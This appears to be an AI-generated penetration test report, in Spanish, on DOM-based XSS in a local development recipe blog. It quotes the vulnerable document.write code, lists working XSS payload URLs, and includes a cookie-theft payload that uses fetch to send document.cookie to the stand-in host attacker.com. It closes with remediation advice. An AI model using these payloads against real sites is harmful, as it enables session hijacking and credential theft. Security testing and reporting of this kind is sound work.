# Informe de Análisis de Seguridad - Cross-Site Scripting (XSS)

**Objetivo:** http://web.dev.local:8082  
**Fecha:** 2026-04-30  
**Hora:** 16:19:22  
**Analista:** GitHub Copilot CLI  
**Tipo de análisis:** Detección y explotación de vulnerabilidades XSS  

---

## Resumen Ejecutivo

Se identificaron **2 vulnerabilidades de tipo Cross-Site Scripting (XSS)** en la aplicación web objetivo. Ambas son de tipo **DOM-based XSS**, ya que el procesamiento del input ocurre completamente en el lado del cliente mediante JavaScript, sin sanitización alguna. La gravedad es **ALTA**.

---

## Descripción de la Aplicación

La aplicación es un "Blog de Recetas" que ofrece:
- Un formulario de búsqueda de recetas mediante parámetro GET `search`
- Un formulario de comentarios mediante parámetros GET `name` y `comment`

---

## Vulnerabilidades Encontradas

### 1. DOM-based XSS en el parámetro `search`

**Tipo:** DOM-based XSS  
**Severidad:** Alta (CVSS ~7.4)  
**Parámetro afectado:** `search` (GET)  

**Código vulnerable:**
```javascript
const urlParams = new URLSearchParams(window.location.search);
const searchTerm = urlParams.get('search');

if (searchTerm) {
    document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
    // ...
}
```

**Descripción:** El valor del parámetro `search` se obtiene directamente de la URL y se inserta en el DOM usando `document.write()` sin ningún tipo de sanitización o codificación. Esto permite inyectar HTML y JavaScript arbitrario.

**Payload de explotación:**
```
http://web.dev.local:8082/?search=<script>alert('XSS-Search')</script>
```

**Payload alternativo (sin etiqueta script):**
```
http://web.dev.local:8082/?search=<img src=x onerror=alert(document.cookie)>
```

**Impacto:** Un atacante puede:
- Robar cookies de sesión del usuario víctima
- Redirigir al usuario a sitios maliciosos
- Ejecutar acciones en nombre del usuario (CSRF via XSS)
- Realizar phishing mediante modificación del DOM

---

### 2. DOM-based XSS Persistente (Stored via localStorage) en parámetros `name` y `comment`

**Tipo:** DOM-based XSS (Stored via localStorage)  
**Severidad:** Alta (CVSS ~7.6)  
**Parámetros afectados:** `name` y `comment` (GET)  

**Código vulnerable:**
```javascript
const name = urlParams.get('name');
const comment = urlParams.get('comment');

if (name && comment) {
    let comments = JSON.parse(localStorage.getItem('comments') || '[]');
    comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
    // ...
}

// Al renderizar:
document.write('<div class="comment-author">' + c.name + '</div>');
document.write('<div>' + c.comment + '</div>');
```

**Descripción:** Los parámetros `name` y `comment` se almacenan en `localStorage` sin sanitización y se renderizan posteriormente en el DOM usando `document.write()`. Esto constituye un XSS "semi-persistente": el payload se almacena localmente y se ejecuta cada vez que la víctima recarga la página.

**Payload de explotación:**
```
http://web.dev.local:8082/?name=Atacante&comment=<script>alert('Stored-XSS')</script>
```

**Payload de robo de cookies:**
```
http://web.dev.local:8082/?name=Hacker&comment=<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">
```

**Impacto adicional:** Al almacenarse en localStorage, el payload persiste para el navegador de esa víctima específica, ejecutándose en cada visita hasta que se limpie el almacenamiento local.

---

## Explotación Demostrada

### Prueba de concepto 1 - DOM XSS en búsqueda

La URL siguiente inyecta código JavaScript directamente en el DOM mediante el parámetro `search`:

```
http://web.dev.local:8082/?search=</strong></p><script>alert('DOM-XSS-Demostrado')</script>
```

El flujo de explotación:
1. Usuario visita la URL maliciosa (enviada por atacante vía email, mensaje, etc.)
2. El navegador ejecuta el JavaScript del servidor
3. `document.write` inserta el payload del atacante en el DOM
4. El script malicioso se ejecuta en el contexto del origen de la víctima

### Prueba de concepto 2 - XSS en comentarios

```
http://web.dev.local:8082/?name=Admin&comment=<svg onload=alert('XSS-Comment')>
```

---

## Análisis Técnico

| Parámetro | Tipo XSS | Sink | Source | Persistencia |
|-----------|----------|------|--------|--------------|
| `search` | DOM-based | `document.write()` | `URLSearchParams.get()` | No (por sesión) |
| `name` | DOM-based (stored) | `document.write()` | `localStorage` → `URLSearchParams.get()` | Sí (localStorage) |
| `comment` | DOM-based (stored) | `document.write()` | `localStorage` → `URLSearchParams.get()` | Sí (localStorage) |

**Causa raíz:** Uso de `document.write()` con datos no sanitizados provenientes de fuentes controladas por el usuario (`window.location.search` y `localStorage`).

---

## Recomendaciones

1. **Eliminar `document.write()`**: Reemplazar por `element.textContent` o `element.innerHTML` con sanitización.
2. **Sanitizar inputs**: Usar una librería como DOMPurify antes de insertar HTML.
3. **Usar `textContent` para texto plano**:
   ```javascript
   // En lugar de:
   document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
   
   // Usar:
   const p = document.createElement('p');
   const strong = document.createElement('strong');
   strong.textContent = searchTerm; // textContent escapa HTML automáticamente
   p.appendChild(strong);
   resultDiv.appendChild(p);
   ```
4. **Implementar Content Security Policy (CSP)**: Añadir cabecera HTTP `Content-Security-Policy` para mitigar la ejecución de scripts no autorizados.
5. **Validar y sanitizar datos en localStorage**: Nunca confiar en datos almacenados en el cliente.

---

## Conclusión

La aplicación web en http://web.dev.local:8082 presenta **vulnerabilidades DOM-based XSS en al menos 3 parámetros**. El uso de `document.write()` con datos no sanitizados es la causa principal. Estas vulnerabilidades permiten a un atacante ejecutar código JavaScript arbitrario en el navegador de las víctimas, pudiendo resultar en robo de credenciales, secuestro de sesión y otras acciones maliciosas. Se recomienda **corrección inmediata**.

---

*Informe generado automáticamente por análisis de seguridad automatizado.*
